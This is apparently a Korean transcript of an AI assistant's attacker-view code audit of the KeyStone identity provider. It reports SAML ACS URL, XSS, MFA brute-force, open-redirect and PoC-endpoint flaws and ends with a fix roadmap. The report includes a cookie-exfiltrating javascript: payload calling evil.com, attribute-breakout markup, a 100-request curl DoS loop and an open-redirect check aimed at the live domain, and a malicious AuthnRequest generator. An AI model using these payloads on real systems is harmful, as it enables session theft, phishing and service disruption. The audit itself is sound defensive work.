레포 먼저 보고 오께.ㅇㅋ 구조 파악. IDP 오픈소스 코드네. 소스 디렉토리 까봐야겠다. 클론받아서 실제 코드 뜯어보자.구조 큼직하게 다 파악됐네. 로그인, OIDC, SAML, WebAuthn, 관리자 UI, LDAP, 감사로그, PoC 엔드포인트까지. 공격자 관점에서 우선순위 높은 것부터 보자: **인증 우회/세션/패스워드/PoC 엔드포인트/rate limit/OIDC redirect/SAML 서명 검증/injection**.여러 문제 후보들이 벌써 보인다. 일단 **PoC 엔드포인트**부터 봐야겠다. `/poc/rs256`, `/poc/argon2`, `/poc/saml-sign`이 프로덕션에 올라가 있으면 그 자체로 공격 surface.오 PoC 엔드포인트 인증 가드가 전혀 없다. 그냥 GET이면 누구나 호출 가능. 이게 프로덕션에 올라가있으면 **DoS 벡터**다 — RSA 2048 키젠 + PBKDF2 100k + XML 서명 라운드트립까지. 요청 한 방당 CPU 많이 쓴다. Cloudflare Workers는 CPU time 제한있지만 그 전에 요금 튀기 좋음.

이제 로그인/hooks/rate limit 보자.여러 개 찝힌다:

1. **PoC 엔드포인트 무인증** — 이미 봄
2. **Rate limit race condition** — SELECT → UPDATE 사이 atomic 아님. 동시 요청 여러 개 보내면 다 `allowed: true` 리턴 가능
3. **CSP `unsafe-inline` script-src** — XSS 방어 약화
4. **hooks에 CSRF 체크 없음** — SvelteKit 기본은 있지만 config에서 끌 수 있음
5. **세션 쿠키 `sameSite: 'lax'`** — OIDC POST 플로우 때문이긴 한데 CSRF 영향 있음

로그인 엔드포인트랑 OIDC authorize, MFA 플로우 보자.MFA 플로우에 심각한 문제 발견. **MFA brute force가 가능하다.** 

로그인 단계에는 rate limit 있는데 (`login:{ip}`, 10회/15분) **MFA 검증 단계(`/mfa`)에는 rate limit이 전혀 없음**. TOTP는 6자리 → 한 윈도우 내 1백만 조합인데 실제로는 시간 윈도우 때문에 30~60초 안에 시도해야 돼도 MFA pending 토큰이 5분짜리고 재사용 가능하면 **수천번 시도 가능**.

MFA pending 토큰 로직 보자. 재사용 가능한지.확정. **MFA brute force 가능:**

1. 패스워드 맞추면 MFA pending 토큰이 **5분 유효한 HMAC 토큰** 발급됨 — 서버 측 카운트/상태 없음, 단순 서명 검증만
2. `/mfa` POST에 **rate limit 없음**
3. TOTP 윈도우 ±1 허용(90초 윈도우, 3개 유효 코드) → **백만 중 3개 맞추면 됨**
4. 토큰이 5분간 계속 쓸 수 있으므로 5분 내 수만번 시도 가능. D1 쓰로틀은 있겠지만 실용적으로 brute force 가능

확률 계산: 5분 동안 초당 50회 요청(D1 고려 보수적) = 15,000회. 3/1,000,000 × 15,000 ≈ 4.5% 확률로 한 세션에 뚫림. 여러 번 로그인해서 재시도하면 확정.

**백업 코드는 더 심각:** 각 백업코드 8자 × 32 문자 = 32^8 ≈ 1.1조라 brute force 자체는 어렵지만, **타이밍 공격** 여지 있음. SHA-256 단순 비교(`hash === storedHash`)인데 백업 코드 10개를 순회하면서 비교함 → 코드가 맞으면 루프 중단되고 early return. 타이밍 사이드채널 가능성 있지만 hash 비교라 실제 공격은 어려움.

이제 OIDC authorize 보자.OIDC client 구현 및 PKCE 검증 보자.**치명적 결함 2개 발견:**

### 🔥 1. Client Secret 평문 저장 & 비교
```typescript
clientSecret === client.clientSecretHash
```
이름은 `clientSecretHash`인데 실제로는 **평문 비교**. 주석에 "M1: 평문 비교"라고 자기도 인정함. 게다가 `===` 직접 비교라 **타이밍 공격**도 이론상 가능. 더 심각한 건 관리자 UI에서 DB에 접근할 수 있는 사용자나 DB 유출 시 즉시 모든 client secret 노출.

### 🔥 2. PKCE `plain` 수락
`verifyPkce`가 `plain` 메소드를 수락한다. authorize에서 `client.requirePkce && method !== 'S256'` 체크를 하긴 하는데, **`requirePkce=false` 클라이언트가 `plain`으로 PKCE를 걸면 수락된다**. plain PKCE는 authorization code 탈취 시 verifier=challenge라 보호가 안됨. 근데 이거보다 더 큰 문제는 **PKCE 없는 public client로 등록되면 PKCE 자체가 bypass 됨**:

authorize에서:
```typescript
if (client.requirePkce) {
  if (!codeChallenge) { ... }  // challenge 없으면 fail
}
```
→ `requirePkce=false`면 challenge 안줘도 OK

grant 생성 시 `codeChallenge: null` 저장 → token 엔드포인트에서:
```typescript
if (grant.codeChallenge) { ... PKCE 검증 ... }
```
→ null이면 검증 skip

클라이언트가 `tokenEndpointAuthMethod === 'none'` (public client)이고 `requirePkce=false`면 **그냥 authorization code 탈취하면 토큰 발급 가능**. 그리고:

```typescript
if (client.tokenEndpointAuthMethod === 'none') return true;
```

public client는 **client_secret 검증 자체를 skip**. redirect_uri 리스트에 등록된 URL 중 하나로 인가 요청만 보내면 되고, 그 코드 탈취하면 끝.

근데 public client가 기본으로 만들어지는지 확인해야 함. 관리자가 PKCE required 걸면 보호는 되니까. 기본값이 뭔지 schema 보자.

### 🔥 3. `parseBasicAuth`에 URL 디코딩 없음
Basic auth RFC에 따르면 client_id/secret에 `:`가 포함되면 URL 인코딩해야 함. 근데 이거보다 먼저 **RFC 6749는 application/x-www-form-urlencoded 디코딩을 요구**한다. `client_id`나 `client_secret`에 `%`, `+`, `:` 같은게 있으면 잘못 파싱됨. 실제 보안 영향은 제한적이지만 spec 위반.ㅇㅋ 기본값은 `requirePkce=true`, `client_secret_basic`. 기본값으로는 안전. 근데 관리자 UI에서 끌 수 있다. 관리자 UI의 OIDC client 생성 보자.관리자 레이아웃 가드 확인.**추가 찾음:** 

### 🔥 관리자 로그인에 MFA가 **강제되지 않음**
`if (await hasTotpCredential(db, user.id))`. 관리자가 MFA 안걸어놓으면 패스워드만으로 로그인됨. bootstrap admin에 TOTP 설정 안하면 관리자 계정은 패스워드 하나로 뚫림. IP당 15분당 10회 + PBKDF2 100k 회 = 100k × 10회 = 초당 200만번? 아니, PBKDF2 100k iteration은 ~100ms 걸림. 10회 × (15분 * N개 프록시 IP) = 분산 brute force 가능.

### 🔥 Admin login + 일반 login rate limit 키 분리
`admin-login:{ip}` vs `login:{ip}` 각각 10회 → **한 IP에서 20회** 가능. 그리고 둘 다 같은 사용자를 대상으로 할 수 있음(관리자 로그인도 `authenticateLocalUser` 씀). 그냥 버그 정도.

이제 **redirect_uri 검증 로직**이 정확히 exact match인지 확인했고 — `parseRedirectUris(client).includes(redirectUri)` — exact string match라서 open redirect는 안됨. 근데 **logout에 open redirect** 있을 수 있음.### 🔥 SAML SLO에 **Open Redirect** 있음!

```typescript
const dest = relayState && /^https?:\/\//.test(relayState) ? relayState : '/';
throw redirect(302, dest);
```

`RelayState` 파라미터가 `https://` 또는 `http://` 으로 시작하면 **무조건 리다이렉트**. 화이트리스트 전혀 없음. `GET /saml/slo?RelayState=https://evil.com/phishing` 요청하면 idp.hyochan.site 도메인을 경유해서 피싱 사이트로 보냄. IDP가 신뢰받는 도메인인 만큼 피싱 효과 극대화.

### 🔥 OIDC end-session에 **PostLogoutRedirectUri 파싱 버그**
```typescript
const allowed = client.postLogoutRedirectUris.split(',').map((u) => u.trim());
```

근데 **관리자 UI에서 저장할 때**는 `parseUris`를 써서 **JSON 배열**로 저장:
```typescript
postLogoutRedirectUris: postLogoutUrisRaw ? parseUris(postLogoutUrisRaw) : null,
```

즉 DB에는 `["https://app.com/logout"]` 같은 **JSON 문자열**이 들어가 있는데, end-session은 이걸 **콤마로 split**해서 체크함. 결과: `["https://app.com/logout"]`를 split하면 `['["https://app.com/logout"]']` (배열 자체가 한 원소). 사용자가 `["https://app.com/logout"]` 그대로 넘기면 매치되지만 정상 URL은 절대 매치 안됨. **기능 망가짐 + 공격자는 원본 JSON 문자열을 넘겨서 리다이렉트 유도 가능**.

이제 SAML 검증 로직 보자. SAML은 XML 공격 많음.여기도 **치명적 문제 많음**:

### 🔥 ACS URL 검증 안됨 → SAML Response 탈취
```typescript
const acsUrl = authnRequest.acsUrl ?? sp.acsUrl;
```
AuthnRequest에서 **AssertionConsumerServiceURL을 받아서 바로 사용**. 공격자가 자기 AssertionConsumerServiceURL이 박힌 AuthnRequest를 보내면 IdP가 **서명된 SAML assertion을 공격자 서버로 POST**해줌. SAML 표준에서는 AssertionConsumerServiceURL을 SP 메타데이터와 대조해야 함. 이거 **CVE 급** 이슈다.

### 🔥 HTML Injection → XSS (RelayState)
```typescript
const relayStateInput = relayState
  ? `<input type="hidden" name="RelayState" value="${relayState.replace(/"/g, '&quot;')}">`
  : '';
```
`"`만 escape하고 `<`, `>`, `&`는 그대로. `RelayState=abc"><script>alert(1)</script>`로 주면 `"`는 escape되지만, 근데 input value 안이라 ... 확인하자. `value="abc&quot;><script>"` → **quot로 escape 되니까 value는 `abc">...` 문자열이 되긴 함**. 즉 innerHTML이 아니라 value라 실제 script 실행은 안됨. 근데:

**`action="${acsUrl.replace(/"/g, '&quot;')}"` 이게 문제.** 공격자가 AuthnRequest에 `AssertionConsumerServiceURL="javascript:alert(1)"` 넣으면:
- acsUrl은 검증 안되므로 그대로 통과
- action 속성에 들어감 → `javascript:` URL로 폼 submit
- **XSS 성공**: idp.hyochan.site 도메인 컨텍스트에서 JS 실행 → 세션 쿠키 탈취

### 🔥 HTML escape 미완
`acsUrl.replace(/"/g, '&quot;')` — `<`, `>` 안 escape됨. `acsUrl`에 `"><script>...</script><form action="` 같은거 넣으면 완전한 XSS.

### 🔥 samlResponseB64 / relayState 이스케이프 없음
`SAMLResponse value="${samlResponseB64}"` — samlResponseB64는 base64라 `"` 없어서 괜찮은데, relayState는 `"`만 처리. `<script>` 태그 자체는 input value 안에선 실행 안되지만 value 밖으로 break out 가능한지? `<>` 안 escape하지만 value는 parsing 맥락상 `"`로 닫히니까 `"` escape만으로 충분. 근데 **` 없는 백틱이나 싱글쿼트는 문제 없지만 `<`는 괜찮음(HTML attr 내부에서 `<`는 리터럴)**. 이 부분은 ok.

ACS URL XSS가 핵심이다. 이제 서명 키 암호화랑 몇 개 더 보자.서명 키 암호화는 괜찮아보임. 근데 **MFA pending token, access token, signing key 래핑에 모두 같은 `signingKeySecret` 사용** → 키 분리 원칙 위반. 한 쪽이 뚫리면 전부 뚫림. HKDF context는 다르지만 같은 root secret.

audit 로그와 XML 파싱 쪽 보자. XXE 가능성.DOMParser로 SAML AuthnRequest 파싱 — **서명 검증 없음**, XXE 검증 없음. @xmldom/xmldom는 외부 엔티티 기본 비활성이지만, 애초에 **AuthnRequest 서명 검증 자체가 없다**. 즉:

1. 공격자가 임의의 `issuer`와 `acsUrl`로 AuthnRequest 생성 가능
2. issuer는 DB에서 SP 조회용으로 쓰임 → 등록된 SP entityId만 알면 됨
3. acsUrl은 위에서 본대로 검증 없이 사용됨

SAML response 생성 쪽도 간단히 보자.여기도 하나 더. user 속성을 XML로 넣을 때 xmlEscape는 쓰는데, SP가 이 assertion을 파싱하는 관점에선 문제없음. 근데:

### 🔥 username이 `${xmlEscape(nameId)}` 같은 식으로 들어가는지 확인해야 함
user.displayName, username 등은 **관리자가 또는 LDAP/자기가 등록**. 자기 username에 `<!ENTITY ...>` 같은걸 넣어서 뭐 해보려해도 xmlEscape하면 단순 XSS는 안됨.

LDAP 쪽 보자. LDAP injection 가능성.---

# 🎯 공격자 시점 KeyStone 코드 감사 결과

실제로 라이브 사이트를 공격하진 않았어. **인증된 취약점 PoC를 실제 서비스에 쏘는 건 소유자 권한이 있어도 명시적인 서면 동의 없으면 선 넘는 영역**이라 코드 레벨 분석만 했다. idp.hyochan.site에 테스트 페이로드 직접 날리는 건 본인이 직접 하거나 설명 따라 해봐 — 아래는 뭘 어떻게 보내야 되는지 구체적인 벡터까지 다 정리한거다.

## 🔥🔥 Critical — 뚫리면 사실상 끝

### 1. **ACS URL 미검증 → SAML Response 탈취 (CVE-급)**

`src/routes/saml/sso/+server.ts:50` 부근:
```typescript
const acsUrl = authnRequest.acsUrl ?? sp.acsUrl;
```

SP가 보낸 AuthnRequest의 `AssertionConsumerServiceURL`을 **DB에 등록된 SP 메타데이터와 대조 없이** 그대로 `action=""`에 꽂아넣음. 로그인한 희생자를 이 링크로 유도하면:

```
GET /saml/sso?SAMLRequest=<공격자가_만든_AuthnRequest_with_ACS=evil.com>
```

→ IDP가 **서명된 SAML Assertion**을 evil.com으로 POST. 공격자는 그걸로 SP에 희생자로 로그인. **SAML 서명이 유효한 상태로 탈취**된다.

### 2. **ACS URL을 통한 DOM XSS**

같은 파일:
```typescript
`<form id="samlForm" method="POST" action="${acsUrl.replace(/"/g, '&quot;')}">`
```

`"`만 replace, `<>&` 전부 raw. 거기에 `acsUrl` 자체가 AuthnRequest에서 온 attacker-controlled. 페이로드:

```xml
AssertionConsumerServiceURL="javascript:fetch('https://evil.com/'+document.cookie)"
```

또는 attribute breakout:
```
AssertionConsumerServiceURL=</form><script>...</script><form action=
```

→ **idp.hyochan.site 도메인에서 임의 JS 실행**. `idp_session` 쿠키는 `httpOnly`라 직접 탈취는 막히지만, 해당 오리진에서 모든 관리자 API 호출 가능 → **CSRF-이나-다름없는 관리자 권한 탈취**. httpOnly 쿠키는 브라우저가 자동으로 붙여줌.

### 3. **MFA Brute Force 가능**

`src/routes/(auth)/mfa/+page.server.ts` — **rate limit 전혀 없음**. 패스워드 단계만 10회/15분 제한.

- MFA pending 토큰은 5분짜리 HMAC 서명 토큰 → 서버 상태 없이 재사용 가능
- TOTP는 ±1 윈도우 허용 (유효 코드 3개)
- 5분 동안 쿠키 하나로 수천번 POST 가능

확률: 시도당 `3/1,000,000`. D1 쓰로틀 감안해도 5분에 수천~수만회 → **한 로그인당 수% 확률로 뚫림**. 당장 안뚫려도 패스워드 재인증 → 또 5분 윈도우 → 반복.

### 4. **PoC 엔드포인트가 프로덕션에 노출**

`/poc/rs256`, `/poc/argon2`, `/poc/saml-sign` — 전부 인증 없는 GET.

- `/poc/rs256`: 요청당 RSA-2048 키 생성 + 서명 + 검증
- `/poc/argon2`: PBKDF2 100k 반복
- `/poc/saml-sign`: XML 서명 + 검증 라운드트립

**Workers CPU time & 요금 폭탄 DoS 벡터**. Workers Free는 CPU time 10ms, Paid는 30s지만 지속 호출하면 Subrequest 과금이 폭발. 초당 수백회 날리면 계정 정지감.

**즉시 조치: `vite.config.ts`나 라우트 분리로 프로덕션 빌드에서 `/poc/*` 제거.**

### 5. **Client Secret 평문 저장 + `===` 비교**

`src/lib/server/oidc/client.ts`:
```typescript
return Boolean(client.clientSecretHash && clientSecret && clientSecret === client.clientSecretHash);
```

필드 이름은 `clientSecretHash`인데 실제로는 **평문**. 관리자 UI `generateSecret()` 결과를 그대로 DB에 저장. DB 백업 하나 털리면 **모든 OIDC 클라이언트 시크릿 노출**. timing safe comparison도 아니라 이론상 타이밍 공격 가능(실전 영향은 작음).

## 🔥 High

### 6. **SAML SLO Open Redirect**

`src/routes/saml/slo/+server.ts`:
```typescript
const dest = relayState && /^https?:\/\//.test(relayState) ? relayState : '/';
throw redirect(302, dest);
```

`GET /saml/slo?RelayState=https://evil.com/phishing` → IDP 도메인 경유 피싱. IDP가 신뢰받는 도메인이라 효과 큼.

### 7. **OIDC end-session PostLogoutRedirectUris 파싱 불일치**

저장은 JSON 배열로:
```typescript
redirectUris: parseUris(redirectUrisRaw)  // JSON.stringify(...)
```

읽기는 콤마 split으로:
```typescript
const allowed = client.postLogoutRedirectUris.split(',').map((u) => u.trim());
```

결과: 정상 케이스는 절대 매치 안됨(기능 고장). 그리고 공격자가 JSON 문자열 전체를 `post_logout_redirect_uri`로 넘기면 매치되는 엣지케이스 존재 가능.

### 8. **관리자 계정 MFA 강제 없음**

`/admin/login` — TOTP 등록 안한 관리자는 패스워드만으로 통과. `IDP_BOOTSTRAP_ADMIN_PASSWORD`로 자동 생성된 계정이 약한 비밀번호면 그냥 뚫림. 그리고 rate limit 키가 `login:` / `admin-login:` 으로 분리돼있어서 같은 IP에서 **20회/15분** 시도 가능.

### 9. **Rate Limit Race Condition**

`src/lib/server/ratelimit/index.ts` — SELECT → UPDATE가 atomic 아님. 동시에 10개 요청 날리면 전부 카운트=1 이하에서 통과 가능. D1이 직렬화된다고 해도 애플리케이션 레벨 race window 있음. 고속 브루트포스 완화 효과 약함.

## 🟡 Medium

### 10. **CSP `script-src 'unsafe-inline'`**
SvelteKit SSR 때문에 어쩔 수 없다는 주석이지만, XSS 방어선 무너짐. `unsafe-inline` 빼고 nonce 기반으로 가는게 정석.

### 11. **키 분리 안됨**
`IDP_SIGNING_KEY_SECRET` 하나로: (a) private JWK 래핑 KEK (b) MFA pending 토큰 HMAC (c) access token HMAC (d) TOTP 시크릿 래핑 KEK. HKDF context 다르긴 해도 root가 같음. 하나 뚫리면 전부.

### 12. **AuthnRequest 서명 검증 없음**
SP 메타데이터에 서명 요구가 있어도 코드에 검증 로직 자체가 없음. 조합하면 #1의 공격 조건이 더 쉬워짐.

### 13. **세션 `sameSite: 'lax'`**
OIDC/SAML POST 바인딩 땜에 어쩔 수 없긴 한데, GET 기반 CSRF 여지는 남음.

---

## 실제 공격 PoC (본인 환경에서만 돌려)

```bash
# 1) PoC endpoint DoS 체크
for i in $(seq 1 100); do curl -s https://idp.hyochan.site/poc/rs256 > /dev/null & done

# 2) SLO Open Redirect
curl -I "https://idp.hyochan.site/saml/slo?RelayState=https://evil.example.com/phish"
# Location 헤더가 evil.example.com이면 확정

# 3) ACS URL XSS (AuthnRequest 만들려면 python 한번 필요)
python3 -c "
import base64, zlib, urllib.parse
xml = '<samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_a\" Version=\"2.0\" IssueInstant=\"2026-04-17T00:00:00Z\" AssertionConsumerServiceURL=\"javascript:alert(document.domain)\"><saml:Issuer>REGISTERED_SP_ENTITY_ID</saml:Issuer></samlp:AuthnRequest>'
deflated = zlib.compress(xml.encode())[2:-4]
print(urllib.parse.quote(base64.b64encode(deflated).decode()))
"
# 출력된 값을 SAMLRequest 파라미터로
# 주의: 로그인된 상태에서 방문해야 폼이 렌더됨
```

---

## 우선순위 수정 로드맵

1. **즉시** (프로덕션 배포 전): PoC 엔드포인트 제거, ACS URL DB 검증, SLO RelayState 화이트리스트, SAML HTML attribute escape 전체 문자
2. **1주 내**: MFA endpoint rate limit, 관리자 MFA 강제, client secret 해시화, postLogoutRedirectUris 파싱 통일
3. **2주 내**: key derivation 분리, AuthnRequest 서명 검증, CSP nonce, rate limit atomic 쿼리

ACS URL XSS + MFA brute force 둘이 진짜 심각. 나머지는 점진 수정해도 되는데 이 두 개는 **지금 당장** 막는게 맞다. 라이브에서 테스트 하기 전에 이거부터 고쳐놔라 — 왜냐면 idp.hyochan.site 로그인된 상태로 #2번 링크 한 번 실수로 클릭하면 본인 세션 탈취되는 수도 있다.